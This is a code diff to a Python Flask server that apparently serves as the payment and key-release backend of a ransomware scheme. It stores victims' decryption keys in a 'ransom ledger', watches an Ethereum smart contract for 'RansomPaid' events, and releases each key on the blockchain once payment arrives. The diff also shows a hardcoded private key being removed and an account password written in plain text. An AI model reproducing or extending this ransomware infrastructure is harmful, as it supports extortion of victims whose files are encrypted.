@@ -12,7 +12,8 @@ app = Flask(__name__)
 # Maps the hashes of the ransomer's victims to their keys
 ransom_ledger = {}
 
-contract_address = '0x3119f49c6B71d0fDa4f2515562662f41356e04Dc'
+# contract_address = '0x3119f49c6B71d0fDa4f2515562662f41356e04Dc'
+contract_address = '0x6332F4caB3770C373dd6FA9b0363775003b8f85B'
 abi = None
 contract = None
 with open('contract-abi.json', 'r') as abi_definition:
@@ -21,31 +22,28 @@ with open('contract-abi.json', 'r') as abi_definition:
 
 transfer_filter = contract.eventFilter("RansomPaid")
 
-# transaction = dict(data=contract._encode_constructor_data(), 'from': w3.eth.accounts[0])
-#
-# acct = Account.privateKeyToAccount("cb060fd3bac9632bf97790850bd74ecd6bfc217fb6014aa5dfda52d18cf23bc7") # TODO make more secure or splittable or something
-# signed = acct.signTransaction(transaction)
-# w3.eth.sendRawTransaction(signed.rawTransaction)
-# print(contract)
-# contract.transact({'from': w3.eth.accounts[0]}).provideKey(2, 13)
-
-
+w3.personal.unlockAccount(w3.eth.accounts[0], 'testacc')
 
 # Checks for new ransom every 5 seconds and sends key to contract if there is one
-def check_ransoms():
+def check_ransoms(ledger):
     for entry in transfer_filter.get_new_entries():
-        # Check if decrypts properly??
+        # TODO Check if decrypts properly
         data = entry['args']['data']
-        # Rinkeby ID 4
-        contract.transact({'from': w3.eth.accounts[0]}).provideKey(data, ransom_ledger[data])
+        # TODO If check on data
+        contract.transact({'from': w3.eth.accounts[0]}).provideKey(data, ledger[data])
 
-    threading.Timer(5.0, check_ransoms).start()
+    threading.Timer(5.0, check_ransoms, [ledger]).start()
 
-check_ransoms()
+check_ransoms(ransom_ledger)
 
 @app.route('/ransom', methods=['get'])
 def get_ransom_info():
-    plainHash = request.args.get('hash')
-    key = request.args.get('key')
+    plainHash = int(request.args.get('hash'))
+    key = int(request.args.get('key'))
     ransom_ledger[plainHash] = key
     return ""
+
+# For debugging
+@app.route('/data')
+def get_dict():
+    return str(ransom_ledger)
